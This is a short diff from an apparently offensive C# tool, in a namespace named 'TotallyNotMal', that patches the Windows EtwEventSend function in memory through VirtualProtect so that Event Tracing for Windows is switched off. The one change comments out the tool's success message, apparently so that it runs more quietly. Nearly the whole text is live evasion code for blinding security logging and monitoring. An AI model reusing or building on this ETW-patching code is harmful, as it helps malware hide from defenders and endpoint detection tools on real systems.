@@ -150,7 +150,7 @@ namespace TotallyNotMal
             if (fVirtualProtect(pEtwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect))
             {
                 Marshal.Copy(patch, 0, pEtwEventSend, patch.Length);
-                Console.WriteLine("[+] Successfully unhooked ETW!");
+                //Console.WriteLine("[+] Successfully unhooked ETW!");
                 fVirtualProtect(pEtwEventSend, (UIntPtr)patch.Length, oldProtect, out oldProtect);
             }
 
